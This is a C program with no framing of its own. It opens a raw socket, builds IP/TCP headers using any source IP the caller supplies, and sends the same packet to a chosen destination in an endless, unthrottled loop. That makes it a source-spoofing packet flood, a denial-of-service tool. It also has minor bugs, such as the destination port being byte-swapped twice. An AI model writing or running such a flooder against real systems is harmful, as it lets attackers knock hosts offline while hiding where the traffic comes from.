#include "utils.h"

#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <errno.h>
#include <arpa/inet.h>

void usage() {
    printf("Usage:\n");
    printf("  -s <source>\n");
    printf("  -d <destination>\n");
}

int main(int argc, char** argv) {
    char *flag_s, *flag_d;
    if (argc < 5) {
        usage();
        return 1;
    }

    for (int i = 0; i < argc; i++) {
        if (argv[i][0] == '-') {
            switch (argv[i][1]) {
                case 's':
                    flag_s = &argv[i][3];
                    break;

                case 'd':
                    flag_d = &argv[i][3];
                    break;

                default:
                    printf("unknown flag '%s'\n", &argv[i][0]);
                    usage();
                    return 1;
            }
        }
    }

    uint32_t source_ip = inet_addr(flag_s);
    uint16_t source_port = htons(12345);
    uint32_t dest_ip = inet_addr(flag_d);
    uint16_t dest_port = htons(3000);

    char datagram[40], ip_header[20], tcp_header[20];
    create_ip_header(ip_header, source_ip, dest_ip);
    create_tcp_header(tcp_header, source_port, dest_port);
    create_datagram(datagram, ip_header, tcp_header);

    struct sockaddr_in daddr;
    daddr.sin_family = AF_INET;
    daddr.sin_port = htons(dest_port);
    daddr.sin_addr.s_addr = dest_ip;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        printf("could not create raw socket: %s\n", strerror(errno));
        return 1;
    }

    int val = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &val, sizeof(val)) < 0) {
        printf("could not set raw socket option: %s\n", strerror(errno));
        return 1;
    }

    while (1) {
        if (sendto(sock, datagram, 40, 0, (struct sockaddr *)&daddr, sizeof(daddr)) < 0) {
            printf("could not send raw tcp packet: %s\n", strerror(errno));
            return 1;
        }
    }

    return 0;
}
